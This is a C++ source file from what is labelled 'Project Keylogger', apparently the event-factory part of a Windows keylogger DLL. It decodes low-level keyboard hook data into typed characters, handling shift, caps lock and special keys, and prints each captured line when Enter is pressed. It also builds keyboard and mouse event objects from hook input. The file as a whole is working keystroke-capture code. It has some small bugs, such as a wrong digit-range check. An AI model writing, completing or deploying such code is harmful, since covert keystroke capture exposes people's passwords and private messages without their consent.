/**
 * Project Keylogger
 */


#include "keylogger_dll/EventFactory.h"
#include <bitset>
#include <cstdio>

 /**
  * EventFactory implementation
  */

  /** Constructor of EventFactory
   *
   */
EventFactory::EventFactory() {
}

void			log(const char *str)
{
	std::cout << str << std::endl;
}

int isCapsLock(void)
{
	return (GetKeyState(VK_CAPITAL) & 0x0001);
}

std::string str = "";

void					analysis(WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
	char val[5];
	DWORD dwMsg = 1;
	switch (wParam)
	{

	case WM_KEYDOWN: // When the key has been pressed. Changed from WM_KEYUP to catch multiple strokes.
	{
		// Assign virtual key code to local variable
		DWORD vkCode = pKeyBoard->vkCode;

		if ((vkCode >= 39) && (vkCode <= 64)) // Keys 0-9
		{
			// TODO fix to shift key HELD down
			if (GetAsyncKeyState(VK_SHIFT)) // Check if shift key is down (fairly accurate)
			{
				switch (vkCode)
					// 0x30-0x39 is 0-9 respectively
				{
				case 0x30:
					str.append("à");
					break;
				case 0x31:
					str.append("&");
					break;
				case 0x32:
					str.append("é");
					break;
				case 0x33:
					str.append("\"");
					break;
				case 0x34:
					str.append("'");
					break;
				case 0x35:
					str.append("(");
					break;
				case 0x36:
					str.append("-");
					break;
				case 0x37:
					str.append("è");
					break;
				case 0x38:
					str.append("_");
					break;
				case 0x39:
					str.append("ç");
					break;
				}
			}
			else // If shift key is not down
			{
				sprintf(val, "%c", vkCode);
				str.append(val);
			}
		}
		else if ((vkCode > 64) && (vkCode < 91)) // Keys a-z
		{
			/*
			The following is a complicated statement to check if the letters need to be switched to lowercase.
			Here is an explanation of why the exclusive or (XOR) must be used.

			Shift   Caps    LowerCase    UpperCase
			T       T       T            F
			T       F       F            T
			F       T       F            T
			F       F       T            F

			The above truth table shows what case letters are typed in,
			based on the state of the shift and caps lock key combinations.

			The UpperCase column is the same result as a str.appendical XOR.
			However, since we're checking the opposite in the following if statement, we'll also include a NOT operator (!)
			Becuase, NOT(XOR) would give us the LowerCase column results.
			*/
			if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock())) // Check if letters should be lowercase
			{
				vkCode += 32; // Un-capitalize letters
			}
			sprintf(val, "%c", vkCode);
			str.append(val);
		}
		else // Every other key
		{
			switch (vkCode)
				// Check for other keys
			{
			case VK_CANCEL:
				str.append("[Cancel]");
				break;
			case VK_SPACE:
				str.append(" ");
				break;
			case VK_LCONTROL:
				str.append("[LCtrl]");
				break;
			case VK_RCONTROL:
				str.append("[RCtrl]");
				break;
			case VK_LMENU:
				str.append("[LAlt]");
				break;
			case VK_RMENU:
				str.append("[RAlt]");
				break;
			case VK_LWIN:
				str.append("[LWindows]");
				break;
			case VK_RWIN:
				str.append("[RWindows]");
				break;
			case VK_APPS:
				str.append("[Applications]");
				break;
			case VK_SNAPSHOT:
				str.append("[PrintScreen]");
				break;
			case VK_INSERT:
				str.append("[Insert]");
				break;
			case VK_PAUSE:
				str.append("[Pause]");
				break;
			case VK_VOLUME_MUTE:
				str.append("[VolumeMute]");
				break;
			case VK_VOLUME_DOWN:
				str.append("[VolumeDown]");
				break;
			case VK_VOLUME_UP:
				str.append("[VolumeUp]");
				break;
			case VK_SELECT:
				str.append("[Select]");
				break;
			case VK_HELP:
				str.append("[Help]");
				break;
			case VK_EXECUTE:
				str.append("[Execute]");
				break;
			case VK_DELETE:
				str.append("[Delete]");
				break;
			case VK_CLEAR:
				str.append("[Clear]");
				break;
			case VK_RETURN:
				log(str.c_str());
				str.clear();
				break;
			case VK_BACK:
				str.append("[Backspace]");
				break;
			case VK_TAB:
				str.append("[Tab]");
				break;
			case VK_ESCAPE:
				str.append("[Escape]");
				break;
			case VK_LSHIFT:
				str.append("[LShift]");
				break;
			case VK_RSHIFT:
				str.append("[RShift]");
				break;
			case VK_CAPITAL:
				str.append("[CapsLock]");
				break;
			case VK_NUMLOCK:
				str.append("[NumLock]");
				break;
			case VK_SCROLL:
				str.append("[ScrollLock]");
				break;
			case VK_HOME:
				str.append("[Home]");
				break;
			case VK_END:
				str.append("[End]");
				break;
			case VK_PLAY:
				str.append("[Play]");
				break;
			case VK_ZOOM:
				str.append("[Zoom]");
				break;
			case VK_DIVIDE:
				str.append("[/]");
				break;
			case VK_MULTIPLY:
				str.append("[*]");
				break;
			case VK_SUBTRACT:
				str.append("[-]");
				break;
			case VK_ADD:
				str.append("[+]");
				break;
			case VK_PRIOR:
				str.append("[PageUp]");
				break;
			case VK_NEXT:
				str.append("[PageDown]");
				break;
			case VK_LEFT:
				str.append("[LArrow]");
				break;
			case VK_RIGHT:
				str.append("[RArrow]");
				break;
			case VK_UP:
				str.append("[UpArrow]");
				break;
			case VK_DOWN:
				str.append("[DownArrow]");
				break;
			case VK_NUMPAD0:
				str.append("[0]");
				break;
			case VK_NUMPAD1:
				str.append("[1]");
				break;
			case VK_NUMPAD2:
				str.append("[2]");
				break;
			case VK_NUMPAD3:
				str.append("[3]");
				break;
			case VK_NUMPAD4:
				str.append("[4]");
				break;
			case VK_NUMPAD5:
				str.append("[5]");
				break;
			case VK_NUMPAD6:
				str.append("[6]");
				break;
			case VK_NUMPAD7:
				str.append("[7]");
				break;
			case VK_NUMPAD8:
				str.append("[8]");
				break;
			case VK_NUMPAD9:
				str.append("[9]");
				break;
			case VK_F1:
				str.append("[F1]");
				break;
			case VK_F2:
				str.append("[F2]");
				break;
			case VK_F3:
				str.append("[F3]");
				break;
			case VK_F4:
				str.append("[F4]");
				break;
			case VK_F5:
				str.append("[F5]");
				break;
			case VK_F6:
				str.append("[F6]");
				break;
			case VK_F7:
				str.append("[F7]");
				break;
			case VK_F8:
				str.append("[F8]");
				break;
			case VK_F9:
				str.append("[F9]");
				break;
			case VK_F10:
				str.append("[F10]");
				break;
			case VK_F11:
				str.append("[F11]");
				break;
			case VK_F12:
				str.append("[F12]");
				break;
			case VK_F13:
				str.append("[F13]");
				break;
			case VK_F14:
				str.append("[F14]");
				break;
			case VK_F15:
				str.append("[F15]");
				break;
			case VK_F16:
				str.append("[F16]");
				break;
			case VK_F17:
				str.append("[F17]");
				break;
			case VK_F18:
				str.append("[F18]");
				break;
			case VK_F19:
				str.append("[F19]");
				break;
			case VK_F20:
				str.append("[F20]");
				break;
			case VK_F21:
				str.append("[F21]");
				break;
			case VK_F22:
				str.append("[F22]");
				break;
			case VK_F23:
				str.append("[F23]");
				break;
			case VK_F24:
				str.append("[F24]");
				break;
			case VK_OEM_2:
				if (GetAsyncKeyState(VK_SHIFT))
					str.append("?");
				else
					str.append("/");
				break;
			case VK_OEM_3:
				if (GetAsyncKeyState(VK_SHIFT))
					str.append("~");
				else
					str.append("`");
				break;
			case VK_OEM_4:
				if (GetAsyncKeyState(VK_SHIFT))
					str.append("{");
				else
					str.append("[");
				break;
			case VK_OEM_5:
				if (GetAsyncKeyState(VK_SHIFT))
					str.append("|");
				else
					str.append("\\");
				break;
			case VK_OEM_6:
				if (GetAsyncKeyState(VK_SHIFT))
					str.append("}");
				else
					str.append("]");
				break;
			case VK_OEM_7:
				if (GetAsyncKeyState(VK_SHIFT))
					str.append("\\");
				else
					str.append("'");
				break;
				break;
			case 0xBC:                //comma
				if (GetAsyncKeyState(VK_SHIFT))
					str.append("<");
				else
					str.append(",");
				break;
			case 0xBE:              //Period
				if (GetAsyncKeyState(VK_SHIFT))
					str.append(">");
				else
					str.append(".");
				break;
			case 0xBA:              //Semi Colon same as VK_OEM_1
				if (GetAsyncKeyState(VK_SHIFT))
					str.append(":");
				else
					str.append(";");
				break;
			case 0xBD:              //Minus
				if (GetAsyncKeyState(VK_SHIFT))
					str.append("_");
				else
					str.append("-");
				break;
			case 0xBB:              //Equal
				if (GetAsyncKeyState(VK_SHIFT))
					str.append("+");
				else
					str.append("=");
				break;
			default:

				/* For More details refer this link http://msdn.microsoft.com/en-us/library/ms646267
				As mentioned in document of GetKeyNameText http://msdn.microsoft.com/en-us/library/ms646300
				Scon code is present in 16..23 bits therefor I shifted the code to correct position
				Same for Extended key flag
				*/
				dwMsg += pKeyBoard->scanCode << 16;
				dwMsg += pKeyBoard->flags << 24;

				char key[16];
				/* Retrieves a string that represents the name of a key.
				1st Parameter dwMsg contains the scan code and Extended flag
				2nd Parameter lpString: lpszName - The buffer that will receive the key name.
				3rd Parameter cchSize: The maximum length, in characters, of the key name, including the terminating null character
				If the function succeeds, a null-terminated string is copied into the specified buffer,
				and the return value is the length of the string, in characters, not counting the terminating null character.
				If the function fails, the return value is zero.
				*/
				GetKeyNameText(dwMsg, key, 15);
				str.append(key);
			}
		}
		std::cout << str << std::endl;
		break;
	}
	default:
		/* Passes the hook information to the next hook procedure in the current hook chain.
		1st Parameter hhk - Optional
		2nd Parameter nCode - The next hook procedure uses this code to determine how to process the hook information.
		3rd Parameter wParam - The wParam value passed to the current hook procedure.
		4th Parameter lParam - The lParam value passed to the current hook procedure
		*/
		return;
	}
	return;
}

/**
 * Function to create a keyboard Event with LPARAM and WPARAM
 * @param LPARAM lparam from hook
 * @param WPARAM wparam from hook
 * @return AEvent* the event created
 */
const AEvent* EventFactory::createKeyboardEvent(WPARAM wParam, LPARAM lParam, t_Context context) {


	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
	int repeatCount = 0;
	context._ms = p->time;
	int scanCode = p->scanCode;
	int vkKeyCode = p->vkCode;
	DWORD tmp = p->dwExtraInfo;
	bool alt = 0;
	bool extend = (tmp > 36);
	bool prevKeyState = 0;
	bool transState = 0;
//	analysis(wParam, lParam);
	AEvent* kbevent = new KeyboardEvent(vkKeyCode, repeatCount, scanCode, extend, alt, prevKeyState, transState, context);
	return kbevent;
}

/**
* Function to create a Mouse Event with LPARAM and WPARAM
* @param LPARAM lparam from hook
* @param WPARAM wparam from hook
* @return AEvent* the event created
*/
const AEvent* EventFactory::createMouseEvent(WPARAM wParam, LPARAM lParam, t_Context context) {
	PMOUSEHOOKSTRUCT p = (PMOUSEHOOKSTRUCT)(lParam);
	context._ms = time(NULL);
	return new MouseEvent(p->wHitTestCode, context);
}